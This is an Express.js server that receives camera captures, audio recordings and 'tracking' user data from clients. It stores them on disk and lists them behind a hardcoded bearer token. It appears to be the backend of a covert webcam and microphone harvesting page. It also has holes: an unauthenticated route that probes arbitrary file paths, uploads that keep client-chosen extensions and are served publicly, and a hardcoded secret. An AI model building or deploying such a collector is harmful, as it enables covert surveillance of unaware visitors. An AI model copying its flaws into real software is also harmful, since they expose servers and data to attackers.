const express = require("express");
const fs = require("fs");
const path = require("path");
const multer = require("multer");

const app = express();
app.use(express.json({ limit: "50mb" })); // Increased limit for larger base64 images
app.use(express.static("public"));

// Set EJS as view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, "public", "uploads");
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Configure multer for audio uploads with proper file extension
const storage = multer.diskStorage({
  destination: function(req, file, cb) {
    cb(null, uploadsDir); // Use the public/uploads directory
  },
  filename: function(req, file, cb) {
    const extension = file.originalname.split('.').pop() || 'webm';
    cb(null, `audio_${Date.now()}.${extension}`);
  }
});

const upload = multer({ storage: storage });

// Endpoint to handle image uploads
app.post("/upload-image", (req, res) => {
  const { image } = req.body;
  if (!image) return res.status(400).send("No image data received");

  try {
    // Handle both PNG and JPEG formats
    let base64Data;
    let extension;
    
    if (image.startsWith('data:image/jpeg')) {
      base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
      extension = 'jpg';
    } else {
      base64Data = image.replace(/^data:image\/png;base64,/, "");
      extension = 'png';
    }
    
    const filePath = path.join(uploadsDir, `capture_${Date.now()}.${extension}`);

    fs.writeFile(filePath, base64Data, "base64", (err) => {
      if (err) {
        console.error("Error saving image:", err);
        return res.status(500).send("Error saving image");
      }
      console.log(`Image saved: ${filePath}`);
      res.send("Image uploaded successfully!");
    });
  } catch (err) {
    console.error("Error processing image:", err);
    res.status(500).send("Error processing image");
  }
});

// Endpoint to handle audio uploads using multer
app.post("/upload-audio", upload.single("audio"), (req, res) => {
  if (!req.file) return res.status(400).send("No audio file received");
  console.log(`Audio saved: ${req.file.path}`);
  res.send("Audio uploaded successfully!");
});

// Endpoint to handle tracking data
app.post("/track", (req, res) => {
  const userData = req.body;
  console.log("User Data Received:", userData);
  
  // Format the data nicely before saving
  const formattedData = JSON.stringify(userData, null, 2);
  fs.appendFileSync("user-data.txt", formattedData + "\n---\n");
  
  res.send("User data saved!");
});

// ----------------------------
// Routes to access uploaded files
// ----------------------------

// Simple password protection middleware (use a more secure method in production)
const protectRoute = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (authHeader && authHeader.startsWith('Bearer ')) {
    const token = authHeader.split(' ')[1];
    // Use a strong, randomly generated token in production
    if (token === 'sharagaki@07') {
      return next();
    }
  }
  res.status(401).send('Unauthorized');
};

// Add routes to list and serve uploaded files
app.get('/uploads', protectRoute, (req, res) => {
  try {
    fs.readdir(uploadsDir, (err, files) => {
      if (err) {
        return res.status(500).send('Error reading upload directory');
      }
      
      // Get file stats for sorting by date
      const fileDetails = files.map(file => {
        const filePath = path.join(uploadsDir, file);
        const stats = fs.statSync(filePath);
        return {
          name: file,
          size: stats.size,
          date: stats.mtime
        };
      });
      
      // Sort files by date, newest first
      fileDetails.sort((a, b) => b.date - a.date);
      
      res.json(fileDetails);
    });
  } catch (error) {
    res.status(500).send(`Error listing files: ${error.message}`);
  }
});

// If you want to add the delete functionality directly to server.js instead of adminRoutes.js
// Add this route (though it's recommended to keep it in adminRoutes.js for organization)

app.delete('/uploads/:filename', protectRoute, (req, res) => {
  const filename = req.params.filename;
  const filePath = path.join(uploadsDir, filename);
  
  // Check for path traversal attempts
  const normalizedPath = path.normalize(filePath);
  
  if (!normalizedPath.startsWith(uploadsDir)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  
  fs.access(filePath, fs.constants.F_OK, (err) => {
    if (err) {
      return res.status(404).json({ error: 'File not found' });
    }
    
    fs.unlink(filePath, (err) => {
      if (err) {
        console.error("Error deleting file:", err);
        return res.status(500).json({ error: 'Failed to delete file' });
      }
      
      console.log(`File deleted: ${filename}`);
      res.json({ message: 'File deleted successfully', filename });
    });
  });
});

// Import admin routes
const adminRoutes = require('./routes/adminRoutes');
app.use('/', adminRoutes);

// Make sure uploads are directly accessible
app.use('/uploads', express.static(path.join(__dirname, 'public', 'uploads')));

// Add a route for debugging file access
app.get('/check-file-access', (req, res) => {
  const filePath = req.query.path;
  const fullPath = path.join(__dirname, filePath || '');
  
  res.json({
    requestedPath: filePath,
    fullPath: fullPath,
    publicDir: path.join(__dirname, 'public'),
    uploadsDir: uploadsDir,
    exists: fs.existsSync(fullPath)
  });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
